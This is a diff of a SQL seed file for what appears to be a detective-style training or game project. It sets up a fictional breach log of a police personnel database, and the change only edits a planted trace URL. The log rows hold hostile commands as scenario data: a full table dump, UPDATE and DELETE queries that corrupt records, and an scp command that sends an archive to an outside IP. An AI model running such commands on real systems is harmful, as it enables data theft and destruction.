@@ -137,12 +137,12 @@ INSERT INTO log_accessi VALUES
 ( 7,'2024-11-15 00:03:17','185.234.219.112', 'SYSTEM',   'QUERY',     'SELECT * FROM poliziotti',               'successo','Dump completo anagrafica agenti'),
 ( 8,'2024-11-15 00:05:42','185.234.219.112', 'SYSTEM',   'QUERY',     'UPDATE poliziotti SET nome=\'[DATI CORROTTI]\', cognome=\'[DATI CORROTTI]\' WHERE id=3','successo','Corruzione dati avvenuta'),
 ( 9,'2024-11-15 00:08:19','185.234.219.112', 'SYSTEM',   'QUERY',     'DELETE FROM poliziotti WHERE id=5',      'successo','Eliminazione record agente'),
-(10,'2024-11-15 00:10:00','185.234.219.112', 'SYSTEM',   'QUERY',     'INSERT INTO parametri_sistema VALUES (NULL,\'last_exfil_destination\',\'http://localhost/progetto-detective/hacker/login.php\',\'BREACH_TRACE\',NOW())','successo','Traccia lasciata involontariamente durante esfiltrazione'),
+(10,'2024-11-15 00:10:00','185.234.219.112', 'SYSTEM',   'QUERY',     'INSERT INTO parametri_sistema VALUES (NULL,\'last_exfil_destination\',\'http://localhost/progettoXAMPP/hacker/login.php\',\'BREACH_TRACE\',NOW())','successo','Traccia lasciata involontariamente durante esfiltrazione'),
 (11,'2024-11-15 00:15:22','185.234.219.112', 'SYSTEM',   'EXFILTRATION','scp dati.tar.gz root@185.234.219.112:/var/www/upload/','successo','Esfiltrazione completata — 2.3 GB trasferiti');
 
 -- Parametri sistema
 INSERT INTO parametri_sistema VALUES
 (1,'versione_sistema',        '4.2.1',                                                            'sistema',   NOW()),
 (2,'ultimo_backup',           '2024-11-14 00:00:00',                                              'sistema',   NOW()),
-(3,'last_exfil_destination',  'http://localhost/progetto-detective/hacker/login.php',              'BREACH_TRACE','2024-11-15 00:10:00'),
+(3,'last_exfil_destination',  'http://localhost/progettoXAMPP/hacker/login.php',              'BREACH_TRACE','2024-11-15 00:10:00'),
 (4,'email_admin',             'admin@polizia.gov.it',                                              'contatti',  NOW());
